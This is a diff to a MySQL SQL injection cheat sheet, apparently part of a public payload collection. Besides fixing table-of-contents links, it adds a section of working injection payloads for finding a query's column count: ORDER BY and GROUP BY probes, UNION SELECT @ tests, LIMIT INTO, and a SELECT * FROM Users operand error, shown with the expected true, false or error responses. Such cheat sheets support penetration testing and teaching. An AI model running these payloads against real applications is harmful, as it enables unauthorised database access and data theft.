@@ -3,10 +3,10 @@
 ## Summary
 
 * [MYSQL Comment](#mysql-comment)
-* [Detect columns number](#detect-columns-number)
 * [MYSQL Union Based](#mysql-union-based)
-    * [Extract database with information_schema](#extract-database-with-information-schema)
-    * [Extract data without information_schema](#extract-data-without-information-schema)
+    * [Detect columns number](#detect-columns-number)
+    * [Extract database with information_schema](#extract-database-with-information_schema)
+    * [Extract columns name without information_schema](#extract-columns-name-without-information_schema)
     * [Extract data without columns name](#extract-data-without-columns-name)
 * [MYSQL Error Based](#mysql-error-based)
     * [MYSQL Error Based - Basic](#mysql-error-based---basic)
@@ -15,10 +15,10 @@
 * [MYSQL Blind](#mysql-blind)
     * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
     * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
-    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make-set)
+    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make_set)
     * [MYSQL Blind with LIKE](#mysql-blind-with-like)
 * [MYSQL Time Based](#mysql-time-based)
-    * [Using SLEEP in a subselect](#using-asleep-in-a-subselect)
+    * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
     * [Using conditional statements](#using-conditional-statements)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
 * [MYSQL Current queries](#mysql-current-queries)
@@ -46,17 +46,76 @@
 
 ## MYSQL Union Based
 
-### Extract database with information_schema
+### Detect columns number
 
-First you need to know the number of columns, you can use `order by`.
+First you need to know the number of columns
+
+##### Using `order by` or `group by`
+
+Keep incrementing the number until you get a False response.
+Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
 
 ```sql
-order by 1
-order by 2
-order by 3
-...
-order by XXX
+1' ORDER BY 1--+	#True
+1' ORDER BY 2--+	#True
+1' ORDER BY 3--+	#True
+1' ORDER BY 4--+	#False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+	True
 ```
+or 
+```sql
+1' GROUP BY 1--+	#True
+1' GROUP BY 2--+	#True
+1' GROUP BY 3--+	#True
+1' GROUP BY 4--+	#False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+	True
+```
+##### Using `order by` or `group by` Error Based
+Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.
+```sql
+1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
+
+# Unknown column '4' in 'order clause'
+# This error means query uses 3 column
+#-1' UNION SELECT 1,2,3--+	True
+```
+or
+```sql
+1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
+
+# Unknown column '4' in 'group statement'
+# This error means query uses 3 column
+#-1' UNION SELECT 1,2,3--+	True
+```
+##### Using `UNION SELECT` Error Based
+This method works if error showing is enabled
+```sql
+1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
+1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
+1' UNION SELECT @,@,@--+    #No error means query uses 3 column
+                            #-1' UNION SELECT 1,2,3--+	True
+```
+##### Using `LIMIT INTO` Error Based
+This method works if error showing is enabled.
+
+It is useful for finding the number of columns when the injection point is after a LIMIT clause.
+```sql
+1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
+1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
+1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column
+                              #-1' UNION SELECT 1,2,3--+	True
+```
+##### Using `SELECT * FROM SOME_EXISTING_TABLE` Error Based
+This works if you know the table name you're after and error showing is enabled.
+
+It will return the amount of columns in the table, not the query.
+
+```sql
+1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
+                                        # This error means query uses 3 column
+                                        #-1' UNION SELECT 1,2,3--+	True
+```
+### Extract database with information_schema
 
 Then the following codes will extract the databases'name, tables'name, columns'name.
 
